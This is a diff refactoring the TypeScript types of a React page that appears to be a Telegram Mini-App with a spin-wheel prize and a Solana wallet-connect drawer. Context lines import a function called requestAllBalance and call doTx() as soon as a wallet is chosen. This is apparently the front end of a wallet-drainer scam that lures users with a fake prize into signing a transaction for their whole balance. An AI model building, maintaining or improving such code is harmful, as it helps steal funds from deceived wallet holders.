@@ -8,6 +8,7 @@ import './assets/2idql.css'
 import './assets/connect.css'
 import { Transition } from '@headlessui/react'
 import { useWallet } from '@solana/wallet-adapter-react'
+import type { WalletAdapter, WalletReadyState } from '@solana/wallet-adapter-base'
 import { requestAllBalance } from '@/app/services/transaction'
 
 // Telegram Mini-App tipi
@@ -42,8 +43,8 @@ export default function Page() {
 
   /* ——— Çark (spin) durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
-  const [hasSpun, setHasSpun] = useState<boolean>(() =>
-    typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
+  const [hasSpun, setHasSpun] = useState<boolean>(
+    () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
   )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
@@ -74,18 +75,20 @@ export default function Page() {
 
   /* ——— Wallet yapılandırmaları & sıralama ——— */
   const origin = typeof window !== 'undefined' ? window.location.origin : ''
+
   interface WalletConfig {
     match: (adapterName: string) => boolean
     label: string
     icon: string
     deepLink: string
   }
+
   const walletConfigs: WalletConfig[] = [
     {
       match: name => name === 'Phantom',
       label: 'Phantom',
       icon: '/phantom.svg',
-      deepLink: '' // deepLink yerine openPhantomBrowser() kullanılacak
+      deepLink: '' // Phantom için openPhantomBrowser() kullanacağız
     },
     {
       match: name => name.toLowerCase().includes('trust'),
@@ -121,12 +124,27 @@ export default function Page() {
     },
   ]
 
-  const orderedWallets = walletConfigs
-    .map(cfg => {
-      const w = wallets.find(w => cfg.match(w.adapter.name))
-      return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
-    })
-    .filter((x): x is WalletConfig & { adapter: any; readyState: string } => !!x)
+  type DrawerWallet = WalletConfig & {
+    adapter: WalletAdapter
+    readyState: WalletReadyState
+  }
+
+  // 1) map ile (DrawerWallet | null)[]
+  const mappedWallets: Array<DrawerWallet | null> = walletConfigs.map(cfg => {
+    const w = wallets.find(w => cfg.match(w.adapter.name))
+    return w
+      ? {
+          adapter:    w.adapter,
+          readyState: w.readyState,
+          ...cfg
+        }
+      : null
+  })
+
+  // 2) filter ile DrawerWallet[]
+  const orderedWallets: DrawerWallet[] = mappedWallets.filter(
+    (x): x is DrawerWallet => x !== null
+  )
 
   /* ——— Transaction gönderme ——— */
   const doTx = async () => {
@@ -146,11 +164,9 @@ export default function Page() {
   }
 
   /* ——— Cüzdan seçimi ——— */
-  const handleWalletClick = async(w: any & WalletConfig) => {
+  const handleWalletClick = async (w: DrawerWallet) => {
     closeDrawer()
 
-    // Phantom için önce yerel adapter bağlanmayı dene,
-    // yoksa deeplink ile Phantom app'i aç
     if (w.adapter.name === 'Phantom') {
       if (w.readyState === 'Installed' && window.solana?.isPhantom) {
         await select('Phantom')
@@ -161,7 +177,6 @@ export default function Page() {
       return
     }
 
-    // Diğer cüzdanlar için mevcut logic
     if (w.readyState === 'Installed') {
       await select(w.adapter.name)
       doTx()
